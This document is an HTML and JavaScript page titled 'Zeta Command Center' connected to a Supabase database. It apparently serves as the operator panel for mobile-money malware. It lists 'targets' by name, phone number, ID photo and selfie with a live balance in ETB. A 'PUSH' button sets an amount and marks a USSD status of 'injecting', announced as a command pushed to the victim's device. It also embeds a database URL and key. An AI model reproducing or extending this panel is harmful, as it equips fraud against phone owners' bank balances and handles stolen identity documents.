<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zeta Control Panel</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #121212; color: #e0e0e0; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { color: #00ff41; border-bottom: 2px solid #00ff41; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #1e1e1e; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
        th { background: #252525; color: #00ff41; }
        .balance { font-weight: bold; color: #ffcc00; }
        .btn-send { background: #00ff41; color: black; border: none; padding: 8px 12px; cursor: pointer; border-radius: 4px; font-weight: bold; }
        .btn-send:hover { background: #00cc33; }
        input[type="number"] { background: #333; color: white; border: 1px solid #444; padding: 8px; border-radius: 4px; width: 100px; }
        .img-thumb { width: 50px; height: 50px; object-fit: cover; border-radius: 4px; cursor: pointer; border: 1px solid #444; }
    </style>
</head>
<body>

<div class="container">
    <h1>ZETA COMMAND CENTER</h1>
    <div id="status">Connecting to Supabase...</div>
    
    <table id="targetTable">
        <thead>
            <tr>
                <th>Name / Phone</th>
                <th>UUID</th>
                <th>Docs</th>
                <th>Live Balance</th>
                <th>Set Amount</th>
                <th>Action</th>
            </tr>
        </thead>
        <tbody>
            </tbody>
    </table>
</div>

<script>
  const { createClient } = supabase;

  const SUPABASE_URL = 'https://apdsaisgviycynayhppl.supabase.co';
  const SUPABASE_KEY = ' sb_publishable_o-0WblWD0aqXRiCakqRtNg_CuEqfmdS';

  const supabaseClient = createClient(SUPABASE_URL, SUPABASE_KEY);
    // 2. FETCH DATA
    async function fetchTargets() {
        const { data, error } = await supabase.from('targets').select('*').order('created_at', { ascending: false });
        if (error) { console.error(error); return; }
        
        const tbody = document.querySelector('#targetTable tbody');
        tbody.innerHTML = '';

        data.forEach(target => {
            const row = `
                <tr>
                    <td><strong>${target.full_name}</strong><br><small>${target.phone_number}</small></td>
                    <td><small>${target.id.substring(0,8)}...</small></td>
                    <td>
                        <img class="img-thumb" src="data:image/png;base64,${target.id_photo_base64}" title="ID Photo">
                        <img class="img-thumb" src="data:image/png;base64,${target.selfie_base64}" title="Selfie">
                    </td>
                    <td class="balance">${target.current_balance} ETB</td>
                    <td><input type="number" id="amt-${target.id}" placeholder="0.00" value="${target.target_amount}"></td>
                    <td><button class="btn-send" onclick="updateAmount('${target.id}')">PUSH</button></td>
                </tr>
            `;
            tbody.innerHTML += row;
        });
        document.getElementById('status').innerText = "System Online | " + data.length + " Targets Found";
    }

    // 3. UPDATE AMOUNT (Remote Command)
    async function updateAmount(id) {
        const amount = document.getElementById(`amt-${id}`).value;
        const { error } = await supabase.from('targets').update({ target_amount: amount, ussd_status: 'injecting' }).eq('id', id);
        
        if (error) alert("Error sending command");
        else alert("Command Pushed to Device: " + amount + " ETB");
    }

    // Initial Load & Realtime Subscription
    fetchTargets();
    supabase.channel('custom-all-channel')
    .on('postgres_changes', { event: '*', schema: 'public', table: 'targets' }, (payload) => {
        fetchTargets(); // Refresh table when data changes
    })
    .subscribe();

</script>
</body>
</html>
